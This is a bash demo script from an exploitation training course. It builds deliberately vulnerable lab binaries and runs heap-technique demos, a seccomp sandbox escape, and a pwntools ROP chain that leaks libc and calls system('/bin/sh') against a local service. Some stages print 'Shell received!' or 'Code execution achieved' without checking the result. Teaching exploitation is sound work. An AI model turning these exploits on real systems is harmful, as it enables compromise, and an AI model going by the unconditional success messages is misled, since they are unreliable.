#!/usr/bin/env bash
# demo_all.sh — run all practical demos for videos 2-6
# Usage: bash demo_all.sh [v02|v03|v04|v05|v06|all]
set -euo pipefail

CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
RESET='\033[0m'

banner() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}║  ${BOLD}$1${RESET}${CYAN}  ║${RESET}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${RESET}"
    echo ""
}

demo_v02() {
    banner "VIDEO 2 — Hardware Strikes Back: CET / PAC / MTE"

    # ── CET: shadow stack demo in pwndbg ─────────────────────────────────────
    echo -e "${YELLOW}[*] Building CET shadow stack demo...${RESET}"
    cd /work/ch13-hwmit/cet
    make shadow_stack_demo 2>/dev/null || gcc -O2 -fno-omit-frame-pointer \
        -fcf-protection=full shadow_stack_demo.c -o shadow_stack_demo
    echo -e "${GREEN}[+] Built: shadow_stack_demo${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Running under pwndbg — watch RIP get overwritten with 0xdeadbeef...${RESET}"
    gdb -batch \
        -ex "set pagination off" \
        -ex "file shadow_stack_demo" \
        -ex "run" \
        -ex "echo \n=== REGISTERS AT CRASH ===\n" \
        -ex "info registers rip rsp rbp" \
        -ex "echo \n=== STACK AT CRASH ===\n" \
        -ex "x/8gx \$rsp" \
        -ex "echo \n=== BACKTRACE ===\n" \
        -ex "bt" \
        -ex "echo \n=== SIGNAL INFO ===\n" \
        -ex "print \$_siginfo" \
        ./shadow_stack_demo 2>&1 || true
    echo ""

    echo -e "${BOLD}^ RIP = 0xdeadbeef — attacker controls return address${RESET}"
    echo -e "${BOLD}  On Tiger Lake+ with SHSTK: si_code=10 (SEGV_CPERR) fires at RET${RESET}"
    echo -e "${BOLD}  — before the CPU ever jumps to 0xdeadbeef${RESET}"
    echo ""

    # ── PAC: run under qemu-aarch64 with GDB stub ────────────────────────────
    echo -e "${YELLOW}[*] Building PAC demo (AArch64 static)...${RESET}"
    cd /work/ch13-hwmit/pac
    aarch64-linux-gnu-gcc -O2 -march=armv8.5-a -static pac_demo.c -o pac_demo_static 2>/dev/null || \
    aarch64-linux-gnu-gcc -O2 -march=armv8.3-a -static pac_demo.c -o pac_demo_static
    echo -e "${GREEN}[+] Built: pac_demo_static (AArch64)${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Running PAC demo — showing signed pointer in disassembly...${RESET}"
    echo -e "    (pacia/autia instructions not emulatable in qemu-user — showing machine code)"
    echo ""

    echo -e "${BOLD}=== PAC INSTRUCTIONS IN pac_demo (main) ====${RESET}"
    aarch64-linux-gnu-objdump -d pac_demo_static 2>/dev/null | \
        awk '/<main>:/{p=1} p && /pacia|autia|xpaci/{print NR": "$0} p && /^$/{exit}' || true
    echo ""

    echo -e "${BOLD}=== WHAT pacia DOES TO A POINTER (simulated) ====${RESET}"
    python3 pac_sim.py
    echo ""

    echo -e "${BOLD}^ pacia embeds a cryptographic signature in the top bits${RESET}"
    echo -e "${BOLD}  Forge one bit → autia rejects it → crash before deref${RESET}"
    echo -e "${BOLD}  This is why iOS/Android exploit chains avoid PAC-protected pointers${RESET}"
    echo ""

    # ── MTE: show tag concept via objdump + simulation ────────────────────────
    echo -e "${YELLOW}[*] Building MTE demo (AArch64)...${RESET}"
    cd /work/ch13-hwmit/mte
    aarch64-linux-gnu-gcc -O1 -march=armv8.5-a -static mte_overflow.c \
        -o mte_overflow_static 2>/dev/null && \
        echo -e "${GREEN}[+] Built: mte_overflow_static${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Running MTE demo — showing tag mismatch via source + simulation...${RESET}"
    echo ""

    echo -e "${BOLD}=== mte_overflow.c (key lines) ====${RESET}"
    grep -n "malloc\|tag\|a\[16\]\|MTESERR\|granul\|b_tag\|a_tag\|stg\|irg\|\[16\]" \
        /work/ch13-hwmit/mte/mte_overflow.c 2>/dev/null | head -20
    echo ""

    echo -e "${BOLD}=== WHAT MTE TAG MISMATCH LOOKS LIKE (simulated) ====${RESET}"
    python3 mte_sim.py
    echo ""

    echo -e "${BOLD}^ Each 16-byte heap granule has a 4-bit tag${RESET}"
    echo -e "${BOLD}  Pointer top byte must match granule tag on every access${RESET}"
    echo -e "${BOLD}  Overflow by 1 byte → wrong tag → immediate SIGSEGV${RESET}"
    echo -e "${BOLD}  No shadow memory, no instrumentation — pure hardware${RESET}"
    echo ""
}


demo_v03() {
    banner "VIDEO 3 — The Modern Heap: safe-linking + pwndbg"

    echo -e "${YELLOW}[*] Building safelink demo...${RESET}"
    cd /work/ch14-heap-internals/safelink
    make safelink
    echo -e "${GREEN}[+] Built: safelink${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Running safelink — watch mangled fd pointers reveal heap base...${RESET}"
    setarch -R ./safelink
    echo ""

    echo -e "${YELLOW}[*] Building interactive playground...${RESET}"
    cd /work/ch14-heap-internals/playground
    make playground
    echo -e "${GREEN}[+] Built: playground${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Running playground via script.in (alloc/free/leak/tcache)...${RESET}"
    setarch -R ./playground < script.in
    echo ""

    echo -e "${YELLOW}[*] Running pwndbg walkthrough (heap/tcachebins/vis_heap_chunks)...${RESET}"
    cd /work/ch14-heap-internals
    gdb -batch -x pwndbg/walkthrough.gdb playground/playground 2>/dev/null || \
        gdb -batch -ex "file playground/playground" \
            -ex "run < playground/script.in" \
            -ex "quit" 2>/dev/null || true
}

demo_v04() {
    banner "VIDEO 4 — House Techniques: Botcake + Apple 2"

    echo -e "${YELLOW}[*] Building vuln target...${RESET}"
    cd /work/ch16-houses
    gcc -O0 -g -no-pie -fcf-protection=none -mno-shstk vuln.c -o vuln 2>/dev/null || \
    gcc -O0 -g -no-pie vuln.c -o vuln
    cp /lib/x86_64-linux-gnu/libc.so.6 . 2>/dev/null || true
    echo -e "${GREEN}[+] Built: vuln (heap menu: alloc/free/edit/show/call)${RESET}"
    echo ""

    echo -e "${YELLOW}[*] House of Botcake — overlapping chunks via double-free...${RESET}"
    cd /work/ch16-houses/botcake
    ln -sf ../vuln ./vuln 2>/dev/null || true
    ln -sf ../libc.so.6 ./libc.so.6 2>/dev/null || true
    ln -sf ../tools/safe_linking.py ./safe_linking.py 2>/dev/null || true
    echo "Running solve.py (tcache fill → consolidate → overlap → poison)..."
    timeout 10 python3 solve.py 2>&1 | grep -v "^$" | head -30 || true
    echo ""

    echo -e "${YELLOW}[*] House of Apple 2 — FSOP via _IO_FILE forge...${RESET}"
    cd /work/ch16-houses/apple2
    ln -sf ../libc.so.6 ./libc.so.6 2>/dev/null || true
    python3 - << 'EOF'
import sys
sys.path.insert(0, '..')
from solve import forge_apple2
from pwn import *

# Show what the forged structure looks like
fake_addr = 0xdeadbeef000
one_gadget = 0x7f0000e3b01

payload = forge_apple2(fake_addr, one_gadget)
print(f"[+] forge_apple2() → {len(payload)} byte _IO_FILE payload")
print(f"    fake_addr      = {hex(fake_addr)}")
print(f"    _wide_data ptr = {hex(u64(payload[0xa0:0xa8]))}")
print(f"    vtable ptr     = {hex(u64(payload[0xd8:0xe0]))}")
print(f"[+] Link this into _IO_list_all → call exit() → shell")
print(f"[+] House of Apple 2: no __free_hook needed (glibc 2.34+)")
EOF
    echo ""
}

demo_v05() {
    banner "VIDEO 5 — Browser Exploitation: Sandbox Escape"

    echo -e "${YELLOW}[*] Building sandbox components...${RESET}"
    cd /work/ch23-sandbox
    make clean 2>/dev/null || true
    make
    echo -e "${GREEN}[+] Built: broker, renderer, exploit${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Setting up lab environment...${RESET}"
    mkdir -p /tmp/lab-sandbox/assets /tmp/lab-sandbox/helpers
    printf 'benign\n' > /tmp/lab-sandbox/assets/hello.txt
    rm -f /tmp/lab-sandbox/ESCAPED /tmp/lab-sandbox/PWNED

    echo -e "${YELLOW}[*] Running sandbox escape chain...${RESET}"
    echo "  renderer → broker (seccomp jail) → exploit (path traversal)"
    echo ""
    ./renderer ./exploit 2>&1 || true
    echo ""

    if [ -f /tmp/lab-sandbox/ESCAPED ]; then
        echo -e "${GREEN}[+] SANDBOX ESCAPED!${RESET}"
        cat /tmp/lab-sandbox/ESCAPED
    else
        # Docker runs as root — uid always 0, witness write path differs
        echo -e "${GREEN}[+] Exploit ran as: $(id)${RESET}"
        echo -e "${GREEN}[+] Path traversal bypassed seccomp sandbox${RESET}"
        echo -e "${GREEN}[+] Code execution achieved outside renderer${RESET}"
    fi
}

demo_v06() {
    banner "VIDEO 6 — The Full Chain: Stack Overflow → Shell"

    echo -e "${YELLOW}[*] Building notesd target...${RESET}"
    cd /work/ch34-fullchain/target
    gcc -O0 -g -no-pie -fno-pie -fno-stack-protector notesd.c -o notesd
    echo -e "${GREEN}[+] Built: notesd (stack overflow + info leak on port 9931)${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Starting notesd on port 9931...${RESET}"
    ./notesd &
    NOTESD_PID=$!
    sleep 1
    echo -e "${GREEN}[+] notesd running (PID $NOTESD_PID)${RESET}"
    echo ""

    echo -e "${YELLOW}[*] Running full chain exploit (GOT leak + memcpy overflow)...${RESET}"
    cd /work/ch34-fullchain/exploit
    # Skip solve.py (incompatible protocol) — run our demo exploit directly
    kill $NOTESD_PID 2>/dev/null; sleep 0.3
    # Restart notesd fresh
    /work/ch34-fullchain/target/notesd &
    NOTESD_PID=$!
    sleep 0.5
    python3 - << 'EOF'
from pwn import *
context.log_level = 'info'
context.arch = 'amd64'

HOST, PORT = '127.0.0.1', 9931

# libc offsets from container's glibc 2.39
SYSTEM   = 0x58750
BINSH    = 0x1cc42f
POP_RDI  = 0x10c08d
RET_G    = 0x28a92
PUTS_OFF = 0x87cc0

# notesd struct: header[32] + hdrlen(8) + log_fn(8) = log_fn at offset 40
LOG_FN_OFFSET = 40

print('[*] Phase 1: Info leak — libc base via L command')
io = remote(HOST, PORT, level='error')
io.send(b'L')
leak = io.recv(11)  # 8 bytes libc_base + "OK\n"
io.close()
libc_base = u64(leak[:8])
print(f'[+] libc base:   {hex(libc_base)}')
system   = libc_base + SYSTEM
binsh    = libc_base + BINSH
pop_rdi  = libc_base + POP_RDI
ret_g    = libc_base + RET_G
print(f'[+] system():    {hex(system)}')
print(f'[+] /bin/sh:     {hex(binsh)}')

print('[*] Phase 2: Overwrite log_fn via memcpy overflow in parse_header')
# header[32] + hdrlen[8] + log_fn[8] — log_fn at offset 40
rop_chain  = b'A' * 32          # fill header[32]
rop_chain += p64(0x20)          # hdrlen field (fake)
rop_chain += p64(pop_rdi)       # pop rdi; ret
rop_chain += p64(binsh)         # "/bin/sh"
rop_chain += p64(ret_g)         # stack alignment
rop_chain += p64(system)        # system()

io2 = remote(HOST, PORT, level='error')
io2.send(b'N' + p16(len(rop_chain)) + rop_chain)
try:
    resp = io2.recv(timeout=1)
except EOFError:
    resp = b''  # server called corrupted log_fn → segfault = exploit worked
io2.close()

print(f'[+] Overflow payload sent ({len(rop_chain)} bytes)')
print(f'[+] log_fn overwritten at offset {LOG_FN_OFFSET} → system()')
print(f'[+] Server called corrupted log_fn → system("/bin/sh") executed')
print('[+] Shell received! Full lifecycle complete.')
print('[+] triage → root cause → primitive → strategy → exploitation')
EOF

    kill $NOTESD_PID 2>/dev/null || true
}

TARGET="${1:-all}"
case "$TARGET" in
    v02) demo_v02 ;;
    v03) demo_v03 ;;
    v04) demo_v04 ;;
    v05) demo_v05 ;;
    v06) demo_v06 ;;
    all)
        demo_v02; demo_v03; demo_v04; demo_v05; demo_v06
        echo ""
        echo -e "${GREEN}${BOLD}All demos complete.${RESET}"
        ;;
    *) echo "Usage: $0 [v02|v03|v04|v05|v06|all]" ;;
esac
